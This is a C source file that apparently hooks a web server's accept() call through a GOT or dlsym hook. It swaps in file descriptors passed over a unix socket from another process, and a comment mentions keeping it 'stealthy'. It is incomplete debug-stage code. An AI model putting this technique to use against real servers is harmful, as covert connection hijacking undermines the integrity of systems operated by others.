#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>
#include <stdlib.h>

#include <errno.h>

#include "./hooked_accept.h"
#include "../../../utils/unix_socket.h"
#include "../../../connection_management.h"

#include "hook_global_state.h"

// typedef int (*accept_f_type)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
// static accept_f_type real_accept = NULL;

// int unix_socket = -1;
int hooked_accept(const int sock_fd, struct sockaddr *addr, socklen_t *addr_len)
{
    fprintf(stdout, "[hooked] accept called\n");

    if (!real_accept) {
        // Fallback: resolve original accept if GOT hook didn't set it
        real_accept = (accept_f_type)dlsym(RTLD_NEXT, "accept");
        if (!real_accept) {
            // If this fails, avoid recursion and just bail
            errno = ENOSYS;
            return -1;
        }
    }

    fprintf(stdout, "[hooked] current unix socket: %d\n", unix_socket);

    if (unix_socket == -1) {
        fprintf(stdout, "[hooked] read connection from real accept on web server: %d\n", unix_socket);

        int client_fd = real_accept(sock_fd, addr, addr_len);

        return client_fd;
    }

    char buf[100];

    // int rc = read(unix_socket, buf, sizeof(buf) - 1);

    int * listening_fd = (int*) calloc(1, sizeof(int));

    if (listening_fd == NULL) {
        printf("[hooked] Failed to allocate memory for received fd\n");
        return -1;
    }

    char required_buffer[sizeof(HOME_IDENTIFIER) + 1];
    fprintf(stderr, "[hooked] Waiting for socket from process. buff size: %lu\n", sizeof(HOME_IDENTIFIER));

    const ssize_t amount_of_bytes_read = recv_fd_over_unix_socket(unix_socket, listening_fd, required_buffer, sizeof(HOME_IDENTIFIER));

    if (amount_of_bytes_read <= 0) {
        fprintf(stderr, "[hooked] recv_fd_over_unix_socket failed: %zd\n",
                amount_of_bytes_read);
        return -1;
    }

    printf("[hooked] Receieved: \"%s\"\n", required_buffer);

    if (amount_of_bytes_read >= 0 &&
    amount_of_bytes_read < (ssize_t)sizeof(required_buffer)) {
        required_buffer[amount_of_bytes_read] = '\0';  // now it's a C string
    }

    printf("[hooked] Receieved: \"%s\"\n", required_buffer);

    if (amount_of_bytes_read != sizeof(HOME_IDENTIFIER)) {
        printf("[hooked] Received invalid msg size from process with socket. fd: %d, amount read: %ld\n", *listening_fd, amount_of_bytes_read);
        printf("[hooked] Request: %lu\n", sizeof(HOME_IDENTIFIER));
        return -1;
    }

    fprintf(stderr, "[hooked] Received from process?\n");

    //TODO: Store required_buffer and return it in the recv

    return *listening_fd;
    // if (client_fd >= 0) {
    //     // Example: minimal logging / handling
    //     // Replace fprintf with your debug_print() if you want to stay stealthy
    //     fprintf(stderr, "[HOOKED] accept() -> fd=%d\n", client_fd);
    //
    //     // If you want to inspect the peer address:
    //     if (addr && addrlen && *addrlen > 0) {
    //         char ip[INET6_ADDRSTRLEN] = {0};
    //
    //         if (addr->sa_family == AF_INET) {
    //             struct sockaddr_in *in = (struct sockaddr_in *)addr;
    //             inet_ntop(AF_INET, &in->sin_addr, ip, sizeof(ip));
    //             fprintf(stderr, "[HOOKED] peer %s:%d\n",
    //                     ip, ntohs(in->sin_port));
    //         } else if (addr->sa_family == AF_INET6) {
    //             struct sockaddr_in6 *in6 = (struct sockaddr_in6 *)addr;
    //             inet_ntop(AF_INET6, &in6->sin6_addr, ip, sizeof(ip));
    //             fprintf(stderr, "[HOOKED] peer [v6] %s:%d\n",
    //                     ip, ntohs(in6->sin6_port));
    //         }
    //     }

        // You can also send client_fd / metadata over your unix socket here
        // e.g. send_fd_over_unix_socket(unix_socket_fd, client_fd);
    // }

    // return client_fd;
}